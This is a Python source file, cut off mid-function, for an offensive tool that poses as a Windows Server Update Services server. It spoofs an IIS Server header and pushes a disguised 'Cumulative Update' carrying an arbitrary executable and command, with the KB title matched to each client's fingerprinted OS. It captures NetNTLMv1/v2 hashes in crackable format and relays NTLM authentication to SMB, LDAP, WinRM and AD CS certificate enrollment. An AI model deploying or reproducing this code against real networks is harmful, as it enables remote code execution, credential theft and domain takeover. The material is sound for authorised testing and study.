#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from random import randint
from urllib.parse import quote, urlparse
import http.client
import xml.etree.ElementTree as ET
import uuid
import html
import datetime
import base64
import hashlib
import json
import re
import sys
import os
import argparse
import threading
import time
import select
import ssl
import tty
import termios

from rich.console import Console # type: ignore

from relay import (
    HTTPNTLMRelayBackend,
    SMBNTLMRelayBackend,
    LDAPNTLMRelayBackend,
)

NTLMSSP_NEGOTIATE_UNICODE = 0x00000001
NTLMSSP_REQUEST_TARGET = 0x00000004
NTLMSSP_NEGOTIATE_NTLM = 0x00000200
NTLMSSP_TARGET_TYPE_SERVER = 0x00020000
NTLMSSP_NEGOTIATE_ALWAYS_SIGN = 0x00008000
NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY = 0x00080000
NTLMSSP_NEGOTIATE_TARGET_INFO = 0x00800000
NTLMSSP_NEGOTIATE_128 = 0x20000000
NTLMSSP_NEGOTIATE_56 = 0x80000000

NTLM_TYPE2_FLAGS = (
    NTLMSSP_NEGOTIATE_UNICODE
    | NTLMSSP_REQUEST_TARGET
    | NTLMSSP_NEGOTIATE_NTLM
    | NTLMSSP_TARGET_TYPE_SERVER
    | NTLMSSP_NEGOTIATE_ALWAYS_SIGN
    | NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY
    | NTLMSSP_NEGOTIATE_TARGET_INFO
    | NTLMSSP_NEGOTIATE_128
    | NTLMSSP_NEGOTIATE_56
)

NTLM_SESSION_TTL = 120



def _secbuf(length, offset):
    return (
        int(length).to_bytes(2, "little")
        + int(length).to_bytes(2, "little")
        + int(offset).to_bytes(4, "little")
    )


def _windows_filetime_now():
    unix_time = time.time()
    windows_epoch_delta = 11644473600
    return int((unix_time + windows_epoch_delta) * 10_000_000)


def _av_pair(av_id, value):
    if isinstance(value, str):
        value = value.encode("utf-16le")
    return int(av_id).to_bytes(2, "little") + len(value).to_bytes(2, "little") + value


def _build_target_info(
    nb_domain="LAB",
    nb_computer="PYWSUS",
    dns_domain="lab.local",
    dns_computer="wsus01.lab.local",
):
    target_info = b""
    target_info += _av_pair(2, nb_domain)  # MsvAvNbDomainName
    target_info += _av_pair(1, nb_computer)  # MsvAvNbComputerName
    target_info += _av_pair(4, dns_domain)  # MsvAvDnsDomainName
    target_info += _av_pair(3, dns_computer)  # MsvAvDnsComputerName
    target_info += _av_pair(
        7, _windows_filetime_now().to_bytes(8, "little")
    )  # MsvAvTimestamp
    target_info += (0).to_bytes(2, "little") + (0).to_bytes(2, "little")  # MsvAvEOL
    return target_info


def _build_ntlm_type2(
    challenge, target_name="PYWSUS", nb_domain="LAB", dns_domain="lab.local"
):
    target_name_bytes = target_name.encode("utf-16le")
    target_info = _build_target_info(
        nb_domain=nb_domain,
        nb_computer=target_name,
        dns_domain=dns_domain,
        dns_computer=f"{target_name.lower()}.{dns_domain}",
    )

    header_len = 48
    target_name_offset = header_len
    target_info_offset = target_name_offset + len(target_name_bytes)

    msg = b""
    msg += b"NTLMSSP\x00"
    msg += (2).to_bytes(4, "little")
    msg += _secbuf(len(target_name_bytes), target_name_offset)
    msg += NTLM_TYPE2_FLAGS.to_bytes(4, "little")
    msg += challenge
    msg += b"\x00" * 8
    msg += _secbuf(len(target_info), target_info_offset)
    msg += target_name_bytes
    msg += target_info

    return base64.b64encode(msg).decode("ascii")


def _read_secbuf(raw, offset):
    if len(raw) < offset + 8:
        return b""

    length = int.from_bytes(raw[offset : offset + 2], "little")
    data_offset = int.from_bytes(raw[offset + 4 : offset + 8], "little")

    if length <= 0:
        return b""

    if data_offset < 0 or data_offset + length > len(raw):
        return b""

    return raw[data_offset : data_offset + length]


def _decode_ntlm_text(raw_value, unicode_enabled=True):
    if not raw_value:
        return ""

    if unicode_enabled:
        try:
            return raw_value.decode("utf-16le", errors="replace").rstrip("\x00")
        except Exception:
            pass

    return raw_value.decode("latin-1", errors="replace").rstrip("\x00")


def _parse_ntlm_type3(token):
    raw = base64.b64decode(token)

    if not raw.startswith(b"NTLMSSP\x00"):
        raise ValueError("not an NTLMSSP message")

    msg_type = int.from_bytes(raw[8:12], "little")
    if msg_type != 3:
        raise ValueError(f"not a Type 3 message: {msg_type}")

    flags = int.from_bytes(raw[60:64], "little") if len(raw) >= 64 else 0
    unicode_enabled = bool(flags & NTLMSSP_NEGOTIATE_UNICODE)

    lm_resp = _read_secbuf(raw, 12)
    nt_resp = _read_secbuf(raw, 20)
    domain_raw = _read_secbuf(raw, 28)
    user_raw = _read_secbuf(raw, 36)
    workstation_raw = _read_secbuf(raw, 44)

    return {
        "domain": _decode_ntlm_text(domain_raw, unicode_enabled),
        "username": _decode_ntlm_text(user_raw, unicode_enabled),
        "workstation": _decode_ntlm_text(workstation_raw, unicode_enabled),
        "flags": f"0x{flags:08x}",
        "lm_response": lm_resp,
        "nt_response": nt_resp,
        "lm_response_hex": lm_resp.hex(),
        "nt_response_hex": nt_resp.hex(),
        "lm_response_len": len(lm_resp),
        "nt_response_len": len(nt_resp),
    }


def _parse_ntlm_type2_challenge(token):
    raw = base64.b64decode(token)

    if not raw.startswith(b"NTLMSSP\x00"):
        raise ValueError("not an NTLMSSP message")

    msg_type = int.from_bytes(raw[8:12], "little")
    if msg_type != 2:
        raise ValueError(f"not a Type 2 message: {msg_type}")

    if len(raw) < 32:
        raise ValueError("Type 2 message is too short")

    return raw[24:32].hex()


def _format_ntlm_capture(parsed, challenge):
    nt_resp = parsed["nt_response"]
    lm_resp = parsed["lm_response"]
    user = parsed["username"]
    domain = parsed["domain"]

    if len(nt_resp) == 24:
        return {
            "version": "NetNTLMv1",
            "hash": f"{user}::{domain}:{lm_resp.hex()}:{nt_resp.hex()}:{challenge}",
            "lm_response": lm_resp.hex(),
            "nt_response": nt_resp.hex(),
            "nt_proof": "",
            "client_blob": "",
        }

    if len(nt_resp) > 24:
        nt_proof = nt_resp[:16].hex()
        client_blob = nt_resp[16:].hex()
        return {
            "version": "NetNTLMv2",
            "hash": f"{user}::{domain}:{challenge}:{nt_proof}:{client_blob}",
            "lm_response": lm_resp.hex(),
            "nt_response": nt_resp.hex(),
            "nt_proof": nt_proof,
            "client_blob": client_blob,
        }

    return {
        "version": "unknown",
        "hash": "",
        "lm_response": lm_resp.hex(),
        "nt_response": nt_resp.hex(),
        "nt_proof": "",
        "client_blob": "",
    }


def _random_kb() -> str:
    """Random KB in the Win10/11 monthly rollup band (5000000–5099999)."""
    return str(randint(5_000_000, 5_099_999))


# ---------------------------------------------------------------------------
# OS fingerprinting from RegisterComputer
#
# win_builds.json is organized by OS family:
#   "Windows 11": { "26100": "24H2", "26200": "25H2", ... }
#   "Windows Server 2025": { "26100": "24H2" }
#
# OSDescription from RegisterComputer (e.g. "Windows 10 Pro",
# "Windows Server 2025 Standard") is matched against section keys
# (longest first to avoid "Windows Server 2012" shadowing "2012 R2").
# Then the build number is looked up inside that section.
# ---------------------------------------------------------------------------

def _load_builds():
    """Load data/win_builds.json -> dict of { os_family: { int(build): version } }.

    Keys starting with '_' are metadata and are skipped.
    """
    path = os.path.join(os.path.abspath(os.path.dirname(__file__)),
                        "data", "win_builds.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            raw = json.load(f)
        result = {}
        for key, builds in raw.items():
            if key.startswith("_") or not isinstance(builds, dict):
                continue
            result[key] = {int(b): v for b, v in builds.items()}
        return result
    except (OSError, json.JSONDecodeError, ValueError):
        return {}

_BUILDS_DB = _load_builds()

# Section keys sorted longest-first so "Windows Server 2012 R2" matches
# before "Windows Server 2012", and "Windows 8.1" before "Windows 8".
_OS_KEYS_SORTED = sorted(_BUILDS_DB.keys(), key=len, reverse=True)

_ARCH_MAP = {
    "AMD64":  "x64-based Systems",
    "amd64":  "x64-based Systems",
    "X86":    "x86-based Systems",
    "x86":    "x86-based Systems",
    "ARM64":  "ARM64-based Systems",
    "arm64":  "ARM64-based Systems",
}

# ---------------------------------------------------------------------------
# Known clients persistence
# Stores { ip: { "build": int, "arch": str, "os_desc": str } } on disk
# so that clients who skip RegisterComputer (WUA cache) still get
# a targeted title even after tool restart or session rotation.
# ---------------------------------------------------------------------------

_KNOWN_CLIENTS_PATH = os.path.join(os.path.abspath(os.path.dirname(__file__)),
                                   "data", "known_clients.json")

def _load_known_clients():
    """Load data/known_clients.json -> { ip: {build, arch, os_desc} }.

    Keys starting with '_' are metadata and are skipped.
    """
    try:
        with open(_KNOWN_CLIENTS_PATH, "r", encoding="utf-8") as f:
            raw = json.load(f)
        return {k: v for k, v in raw.items() if not k.startswith("_")}
    except (OSError, json.JSONDecodeError):
        return {}

def _save_known_clients(clients):
    """Persist the clients dict to data/known_clients.json."""
    try:
        os.makedirs(os.path.dirname(_KNOWN_CLIENTS_PATH), exist_ok=True)
        data = {"_comment": "Known WSUS clients — { ip: {build, arch, os_desc} }. Auto-populated by pywsus."}
        data.update(clients)
        with open(_KNOWN_CLIENTS_PATH, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
            f.write("\n")
    except OSError:
        pass

_known_clients = _load_known_clients()


def _build_kb_title(kb_number, os_build=0, arch="", os_desc=""):
    """Build a realistic Microsoft KB title from client info.

    Two-pass lookup:
      1. Sections whose key appears in OSDescription (longest-first).
         If the build is found there -> use it.
      2. Fallback: try ALL sections for the build number.
         Handles Win11 reporting OSDescription="Windows 10 Pro" (NT 10.0).

    Falls back to generic title if nothing matches.
    """
    now = datetime.datetime.now()
    prefix = f"{now.year}-{now.month:02d} Cumulative Update for"
    arch_label = _ARCH_MAP.get(arch, "")

    os_family = ""
    version   = ""
    os_desc_lower = os_desc.lower()

    # Pass 1: sections matching OSDescription
    for key in _OS_KEYS_SORTED:
        if key.lower() in os_desc_lower:
            v = _BUILDS_DB[key].get(os_build, "")
            if v:
                os_family, version = key, v
                break

    # Pass 2: if not found, try all sections for this build
    # Skip server sections for client descs and vice versa to avoid
    # shared builds (e.g. 26100 = Win11 24H2 AND Server 2025)
    if not version:
        is_server_desc = "server" in os_desc_lower
        for key in _OS_KEYS_SORTED:
            key_is_server = "server" in key.lower()
            if is_server_desc != key_is_server:
                continue
            v = _BUILDS_DB[key].get(os_build, "")
            if v:
                os_family, version = key, v
                break

    # If still no version but OSDescription matched a family, keep the family
    if not os_family and os_desc_lower:
        for key in _OS_KEYS_SORTED:
            if key.lower() in os_desc_lower:
                os_family = key
                break

    # --- Compose title ---
    if os_family and version and arch_label:
        title = f"{prefix} {os_family}, version {version} for {arch_label} (KB{kb_number})"
    elif os_family and version:
        title = f"{prefix} {os_family}, version {version} (KB{kb_number})"
    elif os_family and arch_label:
        title = f"{prefix} {os_family} for {arch_label} (KB{kb_number})"
    elif os_family:
        title = f"{prefix} {os_family} (KB{kb_number})"
    else:
        title = f"{prefix} Windows (KB{kb_number})"

    if os_build:
        title += f" ({os_build})"
    return title


# ---------------------------------------------------------------------------
# WSUS update handler
# ---------------------------------------------------------------------------

class WSUSUpdateHandler:
    def __init__(self, executable_file, executable_name, client_address):
        self.get_config_xml              = ''
        self.get_cookie_xml              = ''
        self.register_computer_xml       = ''
        self.sync_updates_xml            = ''
        self.sync_updates_empty_xml      = ''
        self.get_extended_update_info_xml = ''
        self.report_event_batch_xml      = ''
        self.get_authorization_cookie_xml = ''

        # Two IDs each: parent "Install" update + child "Bundle" update
        self.revision_ids   = [randint(900000, 999999), randint(900000, 999999)]
        self.deployment_ids = [randint(80000, 99999),   randint(80000, 99999)]
        self.uuids          = [uuid.uuid4(), uuid.uuid4()]

        self.executable      = executable_file
        self.executable_name = executable_name
        self.sha1            = ''
        self.sha256          = ''
        self.kb_number       = _random_kb()
        self.kb_title        = ''
        self.client_address  = client_address
        self._cookie_bytes   = os.urandom(47)   # realistic opaque blob per session

        # Per-IP client info: { ip: {"build": int, "arch": str, "os_desc": str} }
        # Populated by RegisterComputer, consumed by GetExtendedUpdateInfo.
        # Initialized from known_clients.json for persistence across restarts.
        self._clients = dict(_known_clients)

        # Raw template + kwargs for get-extended-update-info.xml
        # (rendered per-request with the right kb_title per client IP)
        self._ext_info_template = ''
        self._ext_info_kwargs   = {}

    def get_last_change(self):
        return (datetime.datetime.now() - datetime.timedelta(days=3)).isoformat()

    def get_cookie(self):
        return base64.b64encode(self._cookie_bytes).decode('utf-8')

    def get_expire(self):
        return (datetime.datetime.now() + datetime.timedelta(days=1)).isoformat()

    def set_resources_xml(self, command):
        """Load XML templates from resources/ and inject session values."""
        path = os.path.abspath(os.path.dirname(__file__))
        try:
            with open(f'{path}/resources/get-config.xml', 'r') as f:
                self.get_config_xml = f.read().format(
                    lastChange=self.get_last_change())
                f.close()

            with open(f'{path}/resources/get-cookie.xml', 'r') as f:
                self.get_cookie_xml = f.read().format(
                    expire=self.get_expire(), cookie=self.get_cookie())
                f.close()

            with open(f'{path}/resources/register-computer.xml', 'r') as f:
                self.register_computer_xml = f.read()
                f.close()

            with open(f'{path}/resources/sync-updates.xml', 'r') as f:
                self.sync_updates_xml = f.read().format(
                    revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                    deployment_id1=self.deployment_ids[0], deployment_id2=self.deployment_ids[1],
                    uuid1=self.uuids[0], uuid2=self.uuids[1],
                    expire=self.get_expire(), cookie=self.get_cookie(),
                    last_change=self.get_last_change())

            # Empty SyncUpdates — for driver sync requests (contains <SystemSpec>)
            with open(f'{path}/resources/sync-updates-empty.xml', 'r') as f:
                self.sync_updates_empty_xml = f.read().format(
                    expire=self.get_expire(), cookie=self.get_cookie())
                f.close()

            with open(f'{path}/resources/get-extended-update-info.xml', 'r') as f:
                self._ext_info_template = f.read()
                self._ext_info_kwargs = dict(
                    revision_id1=self.revision_ids[0], revision_id2=self.revision_ids[1],
                    sha1=self.sha1, sha256=self.sha256,
                    filename=self.executable_name, file_size=len(self.executable),
                    command=html.escape(html.escape(command)),
                    url='http://{host}/{path}/{executable}'.format(
                        host=self.client_address, path=uuid.uuid4(),
                        executable=self.executable_name),
                    kb_number=self.kb_number,
                    kb_title='')
                # Generic title — used as fallback for clients that skip RegisterComputer
                self._generic_title = _build_kb_title(self.kb_number)
                self.kb_title = self._generic_title
                self._ext_info_kwargs['kb_title'] = html.escape(self.kb_title)
                self.get_extended_update_info_xml = \
                    self._ext_info_template.format(**self._ext_info_kwargs)
                f.close()

            with open(f'{path}/resources/report-event-batch.xml', 'r') as f:
                self.report_event_batch_xml = f.read()
                f.close()

            with open(f'{path}/resources/get-authorization-cookie.xml', 'r') as f:
                self.get_authorization_cookie_xml = f.read().format(
                    cookie=self.get_cookie())
                f.close()
        except Exception as err:
            _console.print(f"[bold red][ERROR][/] Loading XML resources: {err}")
            sys.exit(1)

    def set_filedigest(self):
        """Compute SHA-1 and SHA-256 of the executable payload."""
        h1   = hashlib.sha1()
        h256 = hashlib.sha256()
        h1.update(self.executable)
        h256.update(self.executable)
        self.sha1   = base64.b64encode(h1.digest()).decode()
        self.sha256 = base64.b64encode(h256.digest()).decode()

    def register_client(self, ip, os_build, arch, os_desc):
        """Store per-IP client info from RegisterComputer and persist to disk.

        Stores raw OS data (not the title) so it stays valid across
        session rotations (new KB number -> new title from same data).
        """
        info = {"build": os_build, "arch": arch, "os_desc": os_desc}
        self._clients[ip] = info
        _known_clients[ip] = info
        _save_known_clients(_known_clients)
        return _build_kb_title(self.kb_number, os_build, arch, os_desc)

    def title_for_ip(self, ip):
        """Compute the KB title for a given IP from stored raw data.

        Returns the targeted title if the IP was seen via RegisterComputer
        (this session or a previous one), generic title otherwise.
        """
        info = self._clients.get(ip)
        if info:
            return _build_kb_title(self.kb_number,
                                   info["build"], info["arch"], info["os_desc"])
        return self._generic_title

    def get_ext_info_xml_for(self, ip):
        """Render GetExtendedUpdateInfo XML with the right kb_title for this IP."""
        title = self.title_for_ip(ip)
        kwargs = dict(self._ext_info_kwargs)
        kwargs['kb_title'] = html.escape(title)
        return self._ext_info_template.format(**kwargs)


# ---------------------------------------------------------------------------
# Display layer
# ---------------------------------------------------------------------------

_console   = Console(highlight=False)
_out_lock  = threading.Lock()
_log_level = 0
_log_file  = None
_hash_file = None
_json_event_file = None
_hash_seen = set()
_captured_hashes = []
_active_relay_backend = None
_active_relay_lock = threading.RLock()

_STYLE = {
    "GetConfig":              "dim",
    "GetCookie":              "bright_magenta",
    "GetAuthorizationCookie": "dim",
    "RegisterComputer":       "bright_white",
    "SyncUpdates":            "bright_green",
    "GetExtendedUpdateInfo":  "bright_yellow",
    "ReportEventBatch":       "bright_blue",
    "FileDownload":           "bright_cyan",
    "HashCapture":            "bold yellow",
    "LDAPPreflight":          "bright_magenta",
    "CERT ISSUED":            "bold bright_green",
    "CERT DENIED":            "yellow",
    "RelayAuth":              "bright_white",
    "WARN":                   "bold red",
}

# Relay outcomes we have already reported once, so the client's retry loop
# (especially the ReportingWebService reposting the same rejected identity every
# second) does not repeat identical lines. Keyed on identity+path+state+auth.
_relay_result_seen = set()
# Identities whose captured hash has already been announced at level 0.
_hash_logged = set()
# Hosts whose event-batch report has already been shown once at level 0.
_report_batch_seen = set()

def _ts():
    return datetime.datetime.now().strftime("%H:%M:%S")


def _active_smb_backend():
    with _active_relay_lock:
        backend = _active_relay_backend

    if isinstance(backend, SMBNTLMRelayBackend):
        return backend

    return None


def _print_smb_sessions():
    backend = _active_smb_backend()
    if not backend:
        _console.print("  [yellow]No active SMB relay backend[/]")
        return

    sessions = backend.list_live_sessions()
    if not sessions:
        _console.print("  [yellow]No kept SMB sessions[/]")
        return

    _console.rule(style="bright_black")
    _console.print(
        f"  [bold cyan]{'ID':<5}{'Identity':<28}{'Target':<22}"
        f"{'Server':<16}{'Sign':<8}Age/Idle[/]"
    )
    for session in sessions:
        identity = session.get("identity", "")[:26]
        target = session.get("target", "")[:20]
        server = session.get("server", "")[:14]
        sign = str(session.get("signing_required", ""))[:6]
        _console.print(
            f"  [white]{session['id']:<5}{identity:<28}{target:<22}"
            f"{server:<16}{sign:<8}{session['age']}s/{session['idle']}s[/]"
        )
    _console.rule(style="bright_black")


def _print_smb_session_shares():
    backend = _active_smb_backend()
    if not backend:
        _console.print("  [yellow]No active SMB relay backend[/]")
        return

    results = backend.list_live_session_shares()
    if not results:
        _console.print("  [yellow]No kept SMB sessions[/]")
        return

    _console.rule(style="bright_black")
    for result in results:
        header = (
            f"  [bold cyan]SMB session {result['id']}[/] "
            f"[white]{result.get('identity', '')}[/] "
            f"[dim]{result['state']}[/]"
        )
        if result.get("error"):
            header += f" [red]{result['error']}[/]"
        _console.print(header)
        for share in result.get("shares", []):
            _console.print(
                f"    [green]{share.get('name', ''):<18}[/] "
                f"[dim]{share.get('remark', '')}[/]"
            )
    _console.rule(style="bright_black")


def _close_smb_sessions():
    backend = _active_smb_backend()
    if not backend:
        _console.print("  [yellow]No active SMB relay backend[/]")
        return

    closed = backend.close_live_sessions()
    _console.print(f"  [bold yellow]Closed {closed} kept SMB session(s)[/]")


def _log(level, ip, action, detail="", direction=""):
    if level > _log_level:
        return
    ts    = _ts()
    style = _STYLE.get(action, "white")
    line  = f"[bright_black]{ts}[/]  [cyan]{ip:<15}[/]  [{style}]{action:<26}[/]"
    if detail:
        line += f"  [dim]{detail}[/]"
    with _out_lock:
        _console.print(line)

    if _log_file and _log_level == 1:
        arrow = {"request": "CLIENT ->  ", "response": "<- SERVER  "}.get(direction, "")
        plain = f"{ts}  {ip:<15}  {arrow}{action:<26}"
        if detail:
            plain += f"  {detail}"
        try:
            with open(_log_file, "a", encoding="utf-8") as fh:
                fh.write(plain + "\n")
        except OSError:
            pass


def _report_relay_outcome(ip, path, mode, identity, result):
    """One clear, de-duplicated line per relay outcome for the default view.

    The Type 3 -> relay -> result handshake is logged in full only under -v. Here we
    surface just the thing the operator is waiting for: whether the relayed identity got
    what we asked for. Certificate issuance is the loud, unmissable case.
    """
    issued   = bool(result.get("adcs_issued"))
    state    = result.get("adcs_issue_state", "")
    service  = result.get("service", "")
    authed   = result.get("authenticated", False)
    is_adcs  = service == "adcs-web-enrollment" or mode == "relay-http" and bool(state)

    # Collapse the client's retry storm: report each distinct outcome once. The state key
    # is mode-aware so a genuinely different result (e.g. list-shares-failed -> shares-listed)
    # still re-reports.
    mode_state = state or result.get("smb_action_state", "") or result.get("ldap_action_state", "")
    key = (identity, path, mode, mode_state, bool(issued), bool(authed))
    if key in _relay_result_seen:
        return
    _relay_result_seen.add(key)

    if issued:
        pfx    = result.get("adcs_pfx_path", "")
        cert_id = result.get("adcs_certificate_id", "")
        with _out_lock:
            _console.rule("[bold bright_green]CERTIFICATE ISSUED[/]", style="bright_green")
            _console.print(
                f"    [bold bright_green]{identity}[/]  ->  [bold]{pfx}[/]"
                f"   [dim](req_id={cert_id})[/]"
            )
            _console.print(
                f"    [dim]next: certipy auth -pfx {pfx} -dc-ip <DC-IP>[/]"
            )
            _console.rule(style="bright_green")
        return

    if is_adcs:
        if authed:
            # Authenticated to /certsrv but no cert - the actionable failure.
            detail = f"identity={identity} authenticated but NOT issued  state={state}"
            dbg = result.get("adcs_debug_path", "")
            if dbg:
                detail += f"  debug={dbg}"
            _log(0, ip, "CERT DENIED", detail)
        else:
            # Rejected before enrollment (e.g. a local account on the reporting service).
            _log(1, ip, "CERT DENIED", f"identity={identity} rejected  state={state}")
        return

    if mode == "relay-winrm":
        wstate = result.get("winrm_state", "")
        if wstate == "executed":
            out = (result.get("winrm_output", "") or "").rstrip()
            with _out_lock:
                _console.rule("[bold bright_green]WINRM SHELL[/]", style="bright_green")
                _console.print(
                    f"    [bold bright_green]{identity}[/]  ->  "
                    f"[bold]{result.get('winrm_command', '')}[/]  "
                    f"[dim](exit={result.get('winrm_exit_code')})[/]"
                )
                for line in out.splitlines() or [""]:
                    _console.print(f"      [white]{line}[/]")
                _console.rule(style="bright_green")
            return
        if wstate == "encryption-required":
            _log(0, ip, "WARN",
                 f"identity={identity} authenticated=True but WinRM requires message encryption "
                 f"(AllowUnencrypted=false) - command blocked. product={result.get('winrm_product','')}")
            return
        if wstate == "identified":
            _log(0, ip, "RelayAuth",
                 f"identity={identity} WinRM reachable + authenticated  product={result.get('winrm_product','')}")
            return
        extra = ""
        if wstate == "auth-failed":
            extra = f" http_status={result.get('winrm_http_status','')}"
            wa = result.get("winrm_www_auth", "")
            if wa:
                extra += f" www-auth='{wa[:40]}'"
        _log(0, ip, "RelayAuth" if authed else "WARN",
             f"identity={identity} authenticated={authed} winrm_state={wstate or 'n/a'}{extra} "
             f"fault={result.get('winrm_fault','') or result.get('winrm_error','')}")
        return

    if mode == "relay-smb":
        # For SMB the operator is watching signing + what the action returned, so surface
        # those, not just "validated". A machine account often authenticates (relay works)
        # yet the follow-up action is denied by the target's ACLs - show both.
        astate = result.get("smb_action_state", "")
        detail = (
            f"identity={identity} authenticated={authed} "
            f"signing_required={result.get('smb_signing_required')} "
            f"action={astate} shares={result.get('share_count', '')}"
        )
        err = result.get("smb_action_error")
        if err:
            detail += f"  ({err.split(' - ', 2)[-1].split('{')[0].strip() or err})"
        _log(0, ip, "RelayAuth" if authed else "WARN", detail)
        return

    if mode == "relay-ldap":
        detail = (
            f"identity={identity} authenticated={authed} "
            f"signing_required={result.get('ldap_signing_required')} "
            f"action={result.get('ldap_action_state', '')} "
            f"whoami={result.get('ldap_whoami', '')}"
        )
        _log(0, ip, "RelayAuth" if authed else "WARN", detail)
        return

    # Generic fallback.
    ok = result.get("service_validated", authed)
    _log(0, ip, "RelayAuth" if ok else "WARN",
         f"identity={identity} service={service or mode} validated={ok}")


def _log_raw(label, content, http_request=""):
    if _log_level < 2 or not _log_file:
        return
    sep = "─" * 72
    header = f"{sep} {_ts()} {label} {sep}"
    try:
        with open(_log_file, "a", encoding="utf-8") as fh:
            fh.write(f"\n{header}\n")
            if http_request:
                fh.write(f" {http_request}\n")
            fh.write(f"{content}\n")
    except OSError:
        pass


def _log_resp(ip, action_name):
    """Write <- SERVER line to log file only (level 1 only, not level 2)."""
    if not _log_file or _log_level != 1:
        return
    try:
        with open(_log_file, "a", encoding="utf-8") as fh:
            fh.write(f"{_ts()}  {ip:<15}  <- SERVER  {action_name + ' (resp)':<26}\n")
    except OSError:
        pass


def _emit_json_event(event, **fields):
    if not _json_event_file:
        return

    record = {
        "time": datetime.datetime.now().isoformat(),
        "event": event,
        **fields,
    }
    try:
        with _out_lock:
            with open(_json_event_file, "a", encoding="utf-8") as fh:
                fh.write(json.dumps(record, ensure_ascii=False, default=str) + "\n")
    except OSError:
        pass


def _store_ntlm_capture(ip, path, mode, identity, capture):
    if not capture.get("hash"):
        return "not-stored"

    record = {
        "time": datetime.datetime.now().isoformat(),
        "ip": ip,
        "path": path,
        "mode": mode,
        "identity": identity,
        **capture,
    }
    _captured_hashes.append(record)
    _emit_json_event("ntlm_capture", **record)

    if capture["hash"] in _hash_seen:
        return "duplicate"

    _hash_seen.add(capture["hash"])

    if _hash_file:
        try:
            with open(_hash_file, "a", encoding="utf-8") as fh:
                fh.write(capture["hash"] + "\n")
            return _hash_file
        except OSError as err:
            return f"write-failed:{err}"

    return "memory"


def _cleanup_ntlm_sessions(server, max_age=NTLM_SESSION_TTL):
    now = time.time()
    with server.ntlm_lock:
        stale = [
            key for key, session in server.ntlm_sessions.items()
            if now - session.get("created_at", now) > max_age
        ]
        for key in stale:
            server.ntlm_sessions.pop(key, None)

    backend = getattr(server, "ntlm_relay_backend", None)
    cleaned_backend = backend.cleanup_sessions(max_age) if backend else 0

    if stale or cleaned_backend:
        _emit_json_event(
            "ntlm_session_cleanup",
            server_sessions=len(stale),
            backend_sessions=cleaned_backend,
        )


def _xml_text(xml_data):
    if isinstance(xml_data, bytes):
        return xml_data.decode("utf-8", errors="replace")
    return str(xml_data)


def _xml_response_body(xml_data):
    if isinstance(xml_data, bytes):
        return xml_data
    return str(xml_data).encode("utf-8")


def _xml_local_name(tag):
    return tag.rsplit("}", 1)[-1]


def _xml_parse(xml_data):
    try:
        return ET.fromstring(xml_data), None
    except ET.ParseError as err:
        return None, err


def _xml_find(root, tag_name):
    if root is None:
        return None

    for elem in root.iter():
        if _xml_local_name(elem.tag) == tag_name:
            return elem

    return None


def _xml_find_text(root, tag_name):
    elem = _xml_find(root, tag_name)
    if elem is None or elem.text is None:
        return ""
    return elem.text.strip()


def _xml_has_tag(root, tag_name):
    return _xml_find(root, tag_name) is not None


def _xml_nested_text(root, parent_name, child_name):
    parent = _xml_find(root, parent_name)
    if parent is None:
        return ""

    for elem in parent.iter():
        if elem is parent:
            continue
        if _xml_local_name(elem.tag) == child_name and elem.text:
            return elem.text.strip()

    return ""


# ---------------------------------------------------------------------------
# HTTP server
# ---------------------------------------------------------------------------

class WSUSBaseServer(BaseHTTPRequestHandler):

    # Spoof the Server header to match a real WSUS (IIS) response.
    # BaseHTTPRequestHandler builds it from server_version + sys_version;
    # overriding version_string() is the cleanest single-point fix.
    def version_string(self):
        return 'Microsoft-IIS/10.0'

    def log_message(self, fmt, *args):
        pass
    def _drain_request_body(self):
        length = int(self.headers.get("Content-Length", "0"))
        if length > 0:
            self.rfile.read(length)


    def _send_empty_response(self, status, connection="close"):
        self.protocol_version = "HTTP/1.1"
        self.send_response_only(status)
        self.send_header("Server", self.version_string())
        self.send_header("Date", self.date_time_string())
        self.send_header("Connection", connection)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _send_ntlm_401(self, token=None, proxy=False):
        self.protocol_version = "HTTP/1.1"
        self.send_response_only(407 if proxy else 401)
        self.send_header("Server", self.version_string())
        self.send_header("Date", self.date_time_string())

        auth_header = "Proxy-Authenticate" if proxy else "WWW-Authenticate"
        if token:
            self.send_header(auth_header, f"NTLM {token}")
        else:
            self.send_header(auth_header, "NTLM")

        self.send_header("Connection", "keep-alive")
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _ntlm_message_type(self, token):
        try:
            raw = base64.b64decode(token)
        except Exception:
            return None

        if not raw.startswith(b"NTLMSSP\x00"):
            return None

        if len(raw) < 12:
            return None

        return int.from_bytes(raw[8:12], "little")

    def _extract_ntlm_authorization(self):
        for header_name, proxy in (
            ("Authorization", False),
            ("Proxy-Authorization", True),
        ):
            value = self.headers.get(header_name, "")
            if not value.lower().startswith("ntlm "):
                continue

            parts = value.split(None, 1)
            if len(parts) != 2:
                return None

            token = parts[1].strip()
            return {
                "header": header_name,
                "proxy": proxy,
                "token": token,
                "message_type": self._ntlm_message_type(token),
            }

        return None

    def _ntlm_session_key(self):
        mode = getattr(self.server, "ntlm_session_key", "ip")
        ip = self.client_address[0]

        if mode == "connection":
            return (ip, self.client_address[1])

        return ip

    def _ntlm_gate(self):
        mode = getattr(self.server, "ntlm_mode", "off")
        ip = self.client_address[0]

        session_key = self._ntlm_session_key()

        if mode == "off":
            return "continue"

        _cleanup_ntlm_sessions(self.server)

        auth_info = self._extract_ntlm_authorization()

        if not auth_info:
            if getattr(self, "_ntlm_authenticated", False):
                return "continue"

            _log(1, ip, "WARN", f"no NTLM auth header on {self.path}; sending 401 NTLM")
            self._drain_request_body()
            self._send_ntlm_401()
            return "handled"

        token = auth_info["token"]
        msg_type = auth_info["message_type"]
        proxy = auth_info["proxy"]

        if msg_type == 1:
            _log(1, ip, "WARN", f"NTLM Type 1 negotiate received on {self.path}")
            self._drain_request_body()

            if mode == "challenge-only":
                self._send_empty_response(204)
                return "handled"

            if mode == "capture":
                challenge = os.urandom(8)
                with self.server.ntlm_lock:
                    self.server.ntlm_sessions[session_key] = {
                        "challenge": challenge.hex(),
                        "created_at": time.time(),
                        "path": self.path,
                        "ip": ip,
                    }

                type2 = _build_ntlm_type2(
                    challenge=challenge,
                    target_name="PYWSUS",
                    nb_domain="LAB",
                    dns_domain="lab.local",
                )

                _log(
                    0, ip, "WARN",
